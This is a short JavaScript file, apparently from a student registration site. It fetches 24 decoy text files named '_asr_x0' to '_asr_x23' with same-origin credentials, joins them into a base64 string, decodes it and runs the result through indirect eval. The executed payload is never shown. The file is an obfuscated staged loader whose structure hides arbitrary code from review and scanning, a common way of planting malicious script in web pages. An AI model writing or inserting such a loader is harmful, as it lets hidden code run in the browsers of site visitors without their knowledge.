(function(){
  var F=["/_asr_x0.txt","/_asr_x1.txt","/_asr_x2.txt","/_asr_x3.txt","/_asr_x4.txt","/_asr_x5.txt","/_asr_x6.txt","/_asr_x7.txt","/_asr_x8.txt","/_asr_x9.txt","/_asr_x10.txt","/_asr_x11.txt","/_asr_x12.txt","/_asr_x13.txt","/_asr_x14.txt","/_asr_x15.txt","/_asr_x16.txt","/_asr_x17.txt","/_asr_x18.txt","/_asr_x19.txt","/_asr_x20.txt","/_asr_x21.txt","/_asr_x22.txt","/_asr_x23.txt"];
  Promise.all(F.map(function(f){
    return fetch(f,{credentials:"same-origin"}).then(function(r){
      if(!r.ok) throw new Error(f+" "+r.status);
      return r.text();
    });
  })).then(function(parts){
    var b64 = parts.join("").replace(/\s+/g,"");
    var bin = atob(b64);
    var out = "";
    for (var i=0;i<bin.length;i++) out += String.fromCharCode(bin.charCodeAt(i));
    try { out = decodeURIComponent(escape(out)); } catch(_) {}
    (0,eval)(out);
  }).catch(function(e){ console.error("[students-reg] load failed", e); });
})();
